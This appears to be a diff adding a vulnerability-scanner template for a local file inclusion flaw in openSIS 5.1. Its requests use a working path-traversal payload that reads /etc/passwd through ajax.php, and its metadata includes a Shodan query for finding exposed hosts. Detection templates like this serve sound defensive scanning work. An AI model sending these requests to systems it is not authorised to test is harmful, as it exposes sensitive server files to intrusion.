@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - regex:
+            - root:[x*]:0:0
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php'
+        - '{{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php'
+id: opensis-lfi
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: openSIS 5.1 is vulnerable to local file inclusion and allows attackers to obtain potentially sensitive information by executing arbitrary local scripts in the context of the web server process. This may allow the attacker to compromise the application and computer; other attacks are also possible.
+    metadata:
+        max-request: 2
+        shodan-query: http.title:"openSIS"
+    name: openSIS 5.1 - Local File Inclusion
+    reference:
+        - https://www.exploit-db.com/exploits/38039
+    severity: high
+    tags:
+        - opensis
+        - edb
+        - Oce
+        - openSIS
